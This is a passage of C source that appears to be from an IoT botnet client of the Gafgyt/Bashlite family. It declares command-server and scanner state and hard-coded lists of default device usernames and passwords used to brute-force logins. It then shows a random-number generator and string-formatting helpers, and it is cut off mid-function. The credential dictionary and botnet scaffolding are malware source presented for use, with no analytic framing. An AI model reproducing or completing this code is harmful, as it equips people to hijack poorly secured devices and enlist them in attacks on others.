int mainCommSock = 0, currentServer = -1, gotIP = 0;
uint32_t *pids;
uint32_t scanPid;
uint64_t numpids = 0;
struct in_addr ourIP;
unsigned char macAddress[6] = {0};
char *usernames[] = {"root\0", "\0", "admin\0", "user\0", "login\0", "guest\0"};
char *passwords[] = {"root\0", "\0", "toor\0", "admin\0", "user\0", "guest\0", "login\0", "changeme\0", "1234\0", "12345\0", "123456\0", "default\0", "pass\0", "password\0"};

//    ___  ___  __      __  ___
//   / __\/ _ \/__\  /\ \ \/ _ \
//  / _\ / /_)/ \// /  \/ / /_\/
// / /  / ___/ _  \/ /\  / /_\\
// \/   \/   \/ \_/\_\ \/\____/

void init_rand(uint32_t x)
{
	int i;

	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;

	for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

uint32_t rand_cmwc(void)
{
	uint64_t t, a = 18782LL;
	static uint32_t i = 4095;
	uint32_t x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (uint32_t)(t >> 32);
	x = t + c;
	if (x < c) {
		x++;
		c++;
	}
	return (Q[i] = r - x);
}

//        _   _ _
//  /\ /\| |_(_) |___
// / / \ \ __| | / __|
// \ \_/ / |_| | \__ \
//  \___/ \__|_|_|___/

void trim(char *str)
{
	int i;
	int begin = 0;
	int end = strlen(str) - 1;

	while (isspace(str[begin])) begin++;

	while ((end >= begin) && isspace(str[end])) end--;
	for (i = begin; i <= end; i++) str[i - begin] = str[i];

	str[i - begin] = '\0';
}

static void printchar(unsigned char **str, int c)
{
	if (str) {
		**str = c;
		++(*str);
	}
	else (void)write(1, &c, 1);
}

static int prints(unsigned char **out, const unsigned char *string, int width, int pad)
{
	register int pc = 0, padchar = ' ';

	if (width > 0) {
		register int len = 0;
		register const unsigned char *ptr;
		for (ptr = string; *ptr; ++ptr) ++len;
		if (len >= width) width = 0;
		else width -= len;
		if (pad & PAD_ZERO) padchar = '0';
	}
	if (!(pad & PAD_RIGHT)) {
		for ( ; width > 0; --width) {
			printchar (out, padchar);
			++pc;
		}
	}
	for ( ; *string ; ++string) {
		printchar (out, *string);
		++pc;
	}
	for ( ; width > 0; --width) {
		printchar (out, padchar);
